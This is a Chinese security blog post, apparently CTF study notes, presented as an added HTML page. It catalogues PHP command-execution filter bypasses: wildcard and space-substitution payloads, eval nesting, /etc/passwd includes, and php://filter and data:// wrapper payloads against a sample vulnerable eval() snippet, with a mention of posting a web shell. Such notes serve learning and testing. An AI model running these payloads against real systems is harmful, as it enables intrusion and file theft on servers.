@@ -1,0 +1,57 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="zhangMini"><title>命令执行 · Mini's blog</title><meta name="description" content="命令执行常用绕过方法过滤了指定字符串
+system(&amp;quot;cat fl*g.php&amp;quot;) : 使用通配符
+system(&amp;quot;tac f???????&amp;quot;) : 使用通配符
+system(&amp;quot;tac fl*g.php&amp;quot;) : 过滤 cat ,倒序输出文本"><meta name="keywords" content="Security, life"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><meta name="generator" content="Hexo 6.3.0"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><img src="/images/logo@2x.png" style="width:127px;"><h3 title=""><a href="/">Mini's blog</a></h3><div class="description"><p>Nothing lasts forever.</p></div></div></div><ul class="social-links"></ul><div class="footer"><a target="_blank" href="/"><span>Theme by </span></a><a target="_blank" rel="noopener" href="https://www.caicai.me"> CaiCai </a><span>&</span><a target="_blank" rel="noopener" href="https://github.com/Ben02/hexo-theme-Anatole"> Ben</a><div class="by_farbox"><a href="https://hexo.io/zh-cn/" target="_blank">Proudly published with Hexo&#65281;</a></div></div></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a href="/">首页</a></li><li><a href="/about">关于</a></li><li><a href="/archives">归档</a></li><li><a href="/tags">tags</a></li></div><div class="information"><div class="back_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li></div><div class="avatar"><img src="/images/favicon.png"></div></div></div><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>命令执行</a></h3></div><div class="post-content"><h2 id="命令执行常用绕过方法"><a href="#命令执行常用绕过方法" class="headerlink" title="命令执行常用绕过方法"></a>命令执行常用绕过方法</h2><h3 id="过滤了指定字符串"><a href="#过滤了指定字符串" class="headerlink" title="过滤了指定字符串"></a>过滤了指定字符串</h3><ul>
+<li><code>system(&quot;cat fl*g.php&quot;)</code> : 使用通配符</li>
+<li><code>system(&quot;tac f???????&quot;)</code> : 使用通配符</li>
+<li><code>system(&quot;tac fl*g.php&quot;)</code> : 过滤 <code>cat</code> ,倒序输出文本</li>
+<li><code>system(&quot;nl fl*g.php&quot;)</code> : 过滤 <code>cat</code> 、 <code>tac</code></li>
+<li><code>system(&quot;cp fl*g.php 1.txt | cat 1.txt&quot;)</code> : 访问 1.txt</li>
+</ul>
+<h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><ul>
+<li>使用TAB键 <code>%09</code> 代替</li>
+<li>使用 <code>&#123;$IFS&#125;</code> 代替</li>
+<li><code>$IFS$9</code> 绕过</li>
+<li><code>&lt;&gt;</code></li>
+<li><code>&lt;</code></li>
+<li><code>,</code></li>
+<li><code>%0a</code></li>
+</ul>
+<blockquote>
+<p><em>可以依次尝试，不一定全都可以绕过</em></p>
+</blockquote>
+<h3 id="过滤小数点"><a href="#过滤小数点" class="headerlink" title="过滤小数点"></a>过滤小数点</h3><ul>
+<li>使用 <code>pos(localeconv)</code> 来获取小数点: localeconv可以返回包括小数点在内的一个数组；pos去取出数组中当前第一个元素，也就是小数点</li>
+</ul>
+<h3 id="常见命令执行函数"><a href="#常见命令执行函数" class="headerlink" title="常见命令执行函数"></a>常见命令执行函数</h3><p>当题目过滤某个函数时候，可以尝试使用其他函数</p>
+<ul>
+<li><code>system()</code></li>
+<li><code>passthur()</code></li>
+<li><code>shell_exec()</code></li>
+<li><code>echo `cat flag.php`</code>   : 反引号（用于命令替换，即将反引号中命令的输出作为另一个命令的参数。也就是说，命令替换会先执行反引号中的命令，然后将其输出作为外部命令的一部分进行处理</li>
+</ul>
+<h3 id="PHP-不需要括号的函数"><a href="#PHP-不需要括号的函数" class="headerlink" title="PHP 不需要括号的函数"></a>PHP 不需要括号的函数</h3><ul>
+<li><code>echo 123</code></li>
+<li><code>print 123</code></li>
+<li><code>include &quot;/etc/passwd&quot;</code></li>
+<li><code>require &quot;/etc/passwd&quot;</code></li>
+<li><code>include_once &quot;/etc/passwd&quot;</code></li>
+<li><code>require_once &quot;/etc/passwd&quot;</code></li>
+</ul>
+<blockquote>
+<p>可以在题目中过滤了括号的情况下尝试</p>
+</blockquote>
+<h3 id="使用-eval-嵌套传参"><a href="#使用-eval-嵌套传参" class="headerlink" title="使用 eval 嵌套传参"></a>使用 <code>eval</code> 嵌套传参</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=eval($_GET[1]);&amp;1=passthru(&quot;cat flag.php&quot;); </span><br></pre></td></tr></table></figure>
+
+<h3 id="使用文件包含和PHP伪协议"><a href="#使用文件包含和PHP伪协议" class="headerlink" title="使用文件包含和PHP伪协议"></a>使用文件包含和PHP伪协议</h3><p>例题如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以使用下面的payload来绕过</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">c=include%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line"></span><br><span class="line"># or</span><br><span class="line"></span><br><span class="line">c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line"></span><br><span class="line"># or</span><br><span class="line"></span><br><span class="line">c=include$_GET[1]?&gt;&amp;1=data://text/plain,<span class="meta">&lt;?php system(&quot;tac flag.php&quot;)?&gt;</span></span><br><span class="line"></span><br><span class="line"># or</span><br><span class="line">c=include$_GET[a]?&gt;a=php://input # post提交php文件内容或一句话木马</span><br></pre></td></tr></table></figure>
+<p>原理：</p>
+<ul>
+<li><code>include$_GET[1]</code> 运用了文件包含漏洞，作用是包含参数1的文件</li>
+<li><code>%0a</code> 是 url 回车符，因为空格被过滤，但在 eval() 函数中，会自动给字符串和变量间添加空格，因此可以不加</li>
+<li><code>?&gt;</code> php 定界符，用于绕过 <code>;</code> ，其原理是 php 遇到定界符会自动在末尾加上一个分号，简单来说就是 php 文件中最后一句在 <code>?&gt;</code> 前可以不加 <code>;</code></li>
+</ul>
+</div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-10-06</span><i class="fa fa-tag"></i><a class="tag" href="/tags/web/" title="web">web </a></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/home?status=,http://example.com/2022/10/06/Command-Execution/,Mini's blog,命令执行,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2022/10/08/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="文件包含">上一篇</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>
